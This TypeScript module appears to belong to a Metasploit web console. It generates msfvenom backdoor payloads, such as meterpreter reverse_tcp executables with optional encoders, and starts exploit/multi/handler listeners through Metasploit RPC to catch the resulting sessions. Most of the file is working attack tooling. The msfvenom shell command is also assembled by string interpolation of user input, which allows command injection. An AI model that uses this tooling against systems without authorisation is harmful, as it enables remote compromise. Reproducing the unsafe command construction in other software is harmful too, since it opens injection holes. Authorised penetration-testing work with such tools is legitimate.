import { getMsfConfig } from "./msf-config";
import { getRpcToken, rpcCall } from "./msf-rpc";
import { execSync } from "child_process";
import * as fs from "fs";
import * as path from "path";
import * as crypto from "crypto";

const PAYLOADS_DIR = path.join(process.cwd(), "payloads");

export type PayloadOptions = {
  payload: string;
  lhost: string;
  lport: number;
  format: string;
  platform?: string;
  arch?: string;
  encoder?: string;
  iterations?: number;
  name?: string;
  extraOptions?: string;
};

export type GeneratedPayload = {
  id: string;
  filename: string;
  payload: string;
  lhost: string;
  lport: number;
  format: string;
  size: number;
  createdAt: string;
  downloaded: boolean;
};

export type Listener = {
  id: string;
  payload: string;
  lhost: string;
  lport: number;
  status: "running" | "stopped";
  sessionCount: number;
  createdAt: string;
  consoleId?: number;
};

export type BackdoorStatus = {
  msfvenomAvailable: boolean;
  dockerAvailable: boolean;
  demoMode: boolean;
};

// ─── Detection ────────────────────────────────────────────────

function isDockerAvailable(): boolean {
  try {
    execSync("docker info", { stdio: "ignore", timeout: 5000 });
    return true;
  } catch {
    return false;
  }
}

function isMsfvenomInDocker(): boolean {
  try {
    execSync("docker exec metasploit-rpc msfvenom --help", {
      stdio: "ignore",
      timeout: 5000,
    });
    return true;
  } catch {
    return false;
  }
}

export function getBackdoorStatus(): BackdoorStatus {
  const config = getMsfConfig();
  if (config.demoMode) {
    return { msfvenomAvailable: false, dockerAvailable: false, demoMode: true };
  }
  const dockerOk = isDockerAvailable();
  return {
    msfvenomAvailable: dockerOk && isMsfvenomInDocker(),
    dockerAvailable: dockerOk,
    demoMode: false,
  };
}

// ─── Payload directory management ─────────────────────────────

function ensurePayloadsDir() {
  if (!fs.existsSync(PAYLOADS_DIR)) {
    fs.mkdirSync(PAYLOADS_DIR, { recursive: true });
  }
}

// ─── Simulated demo helpers ───────────────────────────────────

const demoPayloads: GeneratedPayload[] = [
  {
    id: "demo-1",
    filename: "windows-reverse-tcp.exe",
    payload: "windows/x64/meterpreter/reverse_tcp",
    lhost: "192.168.1.100",
    lport: 4444,
    format: "exe",
    size: 73802,
    createdAt: new Date(Date.now() - 3600000).toISOString(),
    downloaded: false,
  },
  {
    id: "demo-2",
    filename: "linux-reverse-tcp.elf",
    payload: "linux/x64/meterpreter/reverse_tcp",
    lhost: "192.168.1.100",
    lport: 4445,
    format: "elf",
    size: 65123,
    createdAt: new Date(Date.now() - 1800000).toISOString(),
    downloaded: false,
  },
];

const demoListeners: Listener[] = [
  {
    id: "listener-demo-1",
    payload: "windows/x64/meterpreter/reverse_tcp",
    lhost: "0.0.0.0",
    lport: 4444,
    status: "running",
    sessionCount: 1,
    createdAt: new Date(Date.now() - 3600000).toISOString(),
  },
  {
    id: "listener-demo-2",
    payload: "linux/x64/meterpreter/reverse_tcp",
    lhost: "0.0.0.0",
    lport: 4445,
    status: "running",
    sessionCount: 3,
    createdAt: new Date(Date.now() - 7200000).toISOString(),
  },
];

// ─── Generate payload ─────────────────────────────────────────

export async function generatePayload(
  opts: PayloadOptions,
): Promise<GeneratedPayload> {
  const config = getMsfConfig();

  if (config.demoMode) {
    const id = `demo-${Date.now()}`;
    const ext = opts.format === "exe" ? "exe" : opts.format === "elf" ? "elf" : opts.format === "ps1" ? "ps1" : opts.format === "py" ? "py" : "bin";
    const payload: GeneratedPayload = {
      id,
      filename: opts.name ?? `payload-${opts.payload.replace(/\//g, "-")}.${ext}`,
      payload: opts.payload,
      lhost: opts.lhost,
      lport: opts.lport,
      format: opts.format,
      size: Math.floor(Math.random() * 50000) + 30000,
      createdAt: new Date().toISOString(),
      downloaded: false,
    };
    return payload;
  }

  if (!isDockerAvailable() || !isMsfvenomInDocker()) {
    throw new Error(
      "msfvenom is not available. Start Docker and the Metasploit container:\n" +
        "  docker compose up -d",
    );
  }

  ensurePayloadsDir();

  const safeName = (opts.name ?? `payload-${Date.now()}`).replace(
    /[^a-zA-Z0-9._-]/g,
    "_",
  );
  const extMap: Record<string, string> = {
    exe: "exe",
    elf: "bin",
    raw: "bin",
    python: "py",
    powershell: "ps1",
    c: "c",
    cs: "cs",
    ruby: "rb",
    vba: "vba",
    macho: "macho",
    war: "war",
  };
  const ext = extMap[opts.format] ?? "bin";
  const filename = `${safeName}.${ext}`;
  const outputPath = `/payloads/${filename}`;

  const args: string[] = [
    "-p",
    opts.payload,
    `LHOST=${opts.lhost}`,
    `LPORT=${opts.lport}`,
    ...(opts.encoder ? [`-e`, opts.encoder] : []),
    ...(opts.iterations && opts.iterations > 1
      ? [`-i`, String(opts.iterations)]
      : []),
    ...(opts.platform ? [`--platform`, opts.platform] : []),
    ...(opts.arch ? [`-a`, opts.arch] : []),
    ...(opts.extraOptions ? opts.extraOptions.split(/\s+/) : []),
    "-f",
    opts.format,
    "-o",
    outputPath,
  ];

  const cmd = `docker exec metasploit-rpc msfvenom ${args.map(a => `"${a}"`).join(" ")}`;

  try {
    execSync(cmd, { timeout: 60000, stdio: "pipe" });

    // Copy from container to host
    const hostPath = path.join(PAYLOADS_DIR, filename);
    execSync(`docker cp metasploit-rpc:${outputPath} "${hostPath}"`, {
      timeout: 15000,
    });

    const stats = fs.statSync(hostPath);
    const id = crypto.randomUUID();

    return {
      id,
      filename,
      payload: opts.payload,
      lhost: opts.lhost,
      lport: opts.lport,
      format: opts.format,
      size: stats.size,
      createdAt: new Date().toISOString(),
      downloaded: false,
    };
  } catch (err) {
    throw new Error(
      `msfvenom failed: ${err instanceof Error ? err.message : "unknown error"}`,
    );
  }
}

// ─── List generated payloads ──────────────────────────────────

export function listGeneratedPayloads(): GeneratedPayload[] {
  const config = getMsfConfig();
  if (config.demoMode) return demoPayloads;

  ensurePayloadsDir();

  const payloads: GeneratedPayload[] = [];
  try {
    const files = fs.readdirSync(PAYLOADS_DIR);
    for (const file of files) {
      const filePath = path.join(PAYLOADS_DIR, file);
      const stats = fs.statSync(filePath);
      if (stats.isFile()) {
        payloads.push({
          id: crypto.createHash("md5").update(file).digest("hex"),
          filename: file,
          payload: "—",
          lhost: "—",
          lport: 0,
          format: path.extname(file).slice(1) || "bin",
          size: stats.size,
          createdAt: stats.mtime.toISOString(),
          downloaded: false,
        });
      }
    }
  } catch {
    // ignored
  }
  return payloads;
}

// ─── Listener management via RPC ──────────────────────────────

function generateId(): string {
  return crypto.randomUUID().slice(0, 8);
}

export async function createListener(
  payload: string,
  lhost: string,
  lport: number,
): Promise<Listener> {
  const config = getMsfConfig();

  if (config.demoMode) {
    const listener: Listener = {
      id: generateId(),
      payload,
      lhost,
      lport,
      status: "running",
      sessionCount: 0,
      createdAt: new Date().toISOString(),
    };
    return listener;
  }

  const token = await getRpcToken();

  // Step 1: Create a new console
  const consoleResult = await rpcCall<{ id: string }>(
    "console.create",
    [],
    token,
  );
  const consoleId = Number(consoleResult.id);

  const commands = [
    `use exploit/multi/handler`,
    `set PAYLOAD ${payload}`,
    `set LHOST ${lhost}`,
    `set LPORT ${lport}`,
    `set ExitOnSession false`,
    `set EnableStageEncoding true`,
    `exploit -jz`,
  ];

  for (const cmd of commands) {
    await rpcCall("console.write", [consoleId, cmd + "\n"], token);
    await new Promise((r) => setTimeout(r, 300));
  }

  // Read output to verify
  await rpcCall("console.read", [consoleId], token);
  await new Promise((r) => setTimeout(r, 1000));
  const output = await rpcCall<{ data: string; prompt: string; busy: boolean }>(
    "console.read",
    [consoleId],
    token,
  );

  const isRunning = output.data.includes("Job") || output.data.includes("Started");

  return {
    id: generateId(),
    payload,
    lhost,
    lport,
    status: isRunning ? "running" : "stopped",
    sessionCount: 0,
    createdAt: new Date().toISOString(),
    consoleId,
  };
}

export async function listListeners(): Promise<Listener[]> {
  const config = getMsfConfig();

  if (config.demoMode) return demoListeners;

  try {
    const token = await getRpcToken();
    const jobs = await rpcCall<Record<string, Record<string, string>>>(
      "job.list",
      [],
      token,
    );

    const sessions = await rpcCall<Record<string, Record<string, string>>>(
      "session.list",
      [],
      token,
    );

    const sessionCount = Object.keys(sessions).length;

    return Object.entries(jobs).map(([id, info]) => ({
      id,
      payload: (info as Record<string, string>).payload ?? "unknown",
      lhost: (info as Record<string, string>).lhost ?? "0.0.0.0",
      lport: Number((info as Record<string, string>).lport ?? 4444),
      status: "running" as const,
      sessionCount,
      createdAt: new Date().toISOString(),
    }));
  } catch {
    return [];
  }
}

export async function stopListener(id: string): Promise<void> {
  const config = getMsfConfig();

  if (config.demoMode) return;

  const token = await getRpcToken();
  await rpcCall("job.stop", [id], token);
}

// ─── Get demo payload content (for download simulation) ──────

export function getDemoPayloadContent(): Buffer {
  // Return a tiny valid-ish exe header so browsers don't reject it
  const header = Buffer.alloc(1024);
  // MZ header
  header[0] = 0x4d;
  header[1] = 0x5a;
  // PE signature offset
  header[0x3c] = 0x80;
  header[0x80] = 0x50;
  header[0x81] = 0x45;
  header[0x82] = 0x00;
  header[0x83] = 0x00;
  // Machine: x64
  header[0x84] = 0x64;
  header[0x85] = 0x86;
  // Write a note in the binary
  const note = Buffer.from(
    "[Metasploit Console Demo Payload — Not an actual executable]",
  );
  note.copy(header, 128);
  return header;
}
